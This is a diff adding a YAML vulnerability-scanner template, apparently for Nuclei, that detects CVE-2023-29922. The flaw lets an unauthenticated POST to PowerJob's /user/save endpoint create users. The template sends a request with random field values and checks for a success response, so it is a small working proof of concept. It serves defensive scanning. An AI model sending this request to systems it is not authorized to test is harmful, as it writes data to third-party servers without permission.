@@ -1,0 +1,35 @@
+id: poc-yaml-powerjob-save-unauthorized-access
+info:
+  name: PowerJob Unauthorized Access Save Endpoint (CVE-2023-29922)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: CVE-2023-29922
+  description: |
+    This template detects unauthorized access to the /user/save endpoint in PowerJob, where sensitive operations can be performed without authentication.
+
+variables:
+  t1: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /user/save HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"{{t1}}","phone":"{{t1}}","email":"{{t1}}","webHook":"{{t1}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - '"data":null'
+      - type: word
+        part: header
+        words:
+          - "application/json"
